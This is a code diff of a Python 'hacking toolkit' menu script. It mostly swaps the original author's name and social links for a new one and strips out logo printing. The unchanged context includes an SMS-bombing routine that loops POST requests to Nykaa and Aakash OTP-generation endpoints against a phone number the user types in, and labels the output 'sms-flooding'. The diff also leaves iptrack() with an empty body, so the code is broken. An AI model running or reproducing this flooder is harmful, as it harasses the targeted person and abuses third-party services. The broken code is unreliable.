@@ -39,12 +39,11 @@ ____________________________________________________
 
 def about():
     os.system("clear")
-    print(logo)
     print(f"""
 {bcyan}[-]This tool is Created By Cyber Army
 
-{yellow}Author    :  Cyber DK
-Github    :  https://github.com/DK1285
+{yellow}Author    :  Hackethics
+Github    :  https://github.com/Hackethics138
 Version   :  1.0
 
 {red}[-]Warning:
@@ -55,16 +54,16 @@ any misuse of this toolkit !
 
 
 {bgreen}[-]Developer SocialMedia
-{red}[{byellow}1{red}]{white}-{red}>{bcyan}DK   : Instagram
-{red}[{byellow}2{red}]{white}-{red}>{bcyan}DK   : Telegram
+{red}[{byellow}1{red}]{white}-{red}>{bcyan}Hackethics   : Instagram
+{red}[{byellow}2{red}]{white}-{red}>{bcyan}Hackethics   : Telegram
 {red}[{byellow}0{red}]{white}-{red}>{bcyan}Exit
 """)
     option=input(f"{bred}Choose an option:{white}")
     try:
         if option=="1":
-            os.system("xdg-open https://www.instagram.com/sincrypt_dk/ > /dev/null 2>&1 &")
+            os.system("xdg-open https://www.instagram.com/hackethics138/ > /dev/null 2>&1 &")
         elif option=="2":
-            os.system("xdg-open https://t.me/cyber_dk/ > /dev/null 2>&1 &")
+            os.system("xdg-open https://t.me/hackethics138/ > /dev/null 2>&1 &")
         elif option=="0":
             logic()
         else:
@@ -74,10 +73,9 @@ any misuse of this toolkit !
     except:
         print(f"{red}SomeThing Went Wrong...")
 def iptrack():
-    os.system('python iptrack.py' if name=='nt' else 'python3 iptrack.py')
+    
 def logic():
     os.system("clear")
-    print(logo)
     print(meanu)
     option=input(f"{bred}Choose an option:{white}")
     try:
@@ -89,11 +87,9 @@ def logic():
             iptrack()
         elif option=="4":
             os.system("clear")
-            print(logo)
             print(f"{bgreen}Thank You For Using...")
         else:
             os.system("clear")
-            print(logo)
             print(meanu)
             print(f"{red}Invlied Option....")
             time.sleep(0.8)
@@ -104,10 +100,8 @@ def logic():
 def boomber():
     global number
     os.system("clear")
-    print(logo)
     number=input(f"{bred}Enter the number:{white}")
     os.system("clear")
-    print(logo)
    
     nykaa_url = "https://www.nykaafashion.com/webscripts/api/otp/generate"
     nykaa_headers = {
@@ -152,7 +146,6 @@ def boomber():
         nykaa_response = requests.post(nykaa_url, headers=nykaa_headers, json=nykaa_data)
         aakash_response = requests.post(aakash_url, headers=aakash_headers, data=aakash_data)
         os.system("clear")
-        print(logo)
         a=i+1
         print(f"{yellow}-->{bred}sms-flooding..{bcyan}{a}")
         
